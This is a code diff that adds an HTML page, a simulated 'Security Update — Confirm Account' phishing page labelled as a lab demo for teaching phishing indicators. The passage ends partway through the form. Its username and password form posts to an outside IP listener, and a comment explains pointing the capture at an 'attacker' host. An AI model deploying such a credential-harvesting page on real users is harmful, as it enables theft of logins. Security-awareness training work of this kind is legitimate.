@@ -1,0 +1,37 @@
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8" />
+  <meta name="viewport" content="width=device-width,initial-scale=1" />
+  <title>Security Update — Confirm Account</title>
+  <style>
+    body { font-family: Inter, Arial, sans-serif; background:#f6f8fb; color:#222; }
+    .card { background:#fff; max-width:720px; margin:48px auto; padding:28px; border-radius:8px; box-shadow:0 8px 20px rgba(30,40,60,0.07); }
+    h1 { color:#b22222; margin-bottom:6px; }
+    p.note { color:#666; font-size:0.95rem; }
+    label { display:block; margin-top:12px; font-weight:600; }
+    input[type="text"], input[type="password"] { width:100%; padding:10px 12px; margin-top:6px; border:1px solid #d7dbe6; border-radius:6px; font-size:0.95rem; }
+    button { margin-top:14px; padding:10px 14px; background:#0073e6; color:#fff; border:none; border-radius:6px; font-weight:600; cursor:pointer; }
+    footer { margin-top:18px; font-size:0.85rem; color:#777; }
+    .danger { color:#b30; font-weight:700; }
+    .meta { font-size:0.85rem; color:#888; margin-top:10px; }
+  </style>
+</head>
+<body>
+  <div class="card">
+    <h1>Security Update — Confirm Account</h1>
+    <p class="note"><strong>Lab demo only.</strong> Do <em>not</em> enter real credentials. This simulated page demonstrates common phishing indicators (URL mismatch, missing TLS, suspicious form target).</p>
+
+    <!--
+      NOTE: default action below posts to /log (port 9000) on the current host.
+      Change the action attribute only in your lab environment:
+        - To capture on the target: action="http://13.60.156.138:9000/log"
+        - To capture on the attacker: action="http://13.6.208.177:9000/log"
+      Always restrict listener inbound rules to lab IPs only.
+    -->
+    <form method="post" action="http://13.60.156.138:9000/log" autocomplete="off">
+      <label for="user">Username or email</label>
+      <input id="user" name="user" type="text" placeholder="email@example.com" />
+
+      <label for="pass">Password</label>
+      <input id="pass" name="pass" type="password" placeholder="password" />
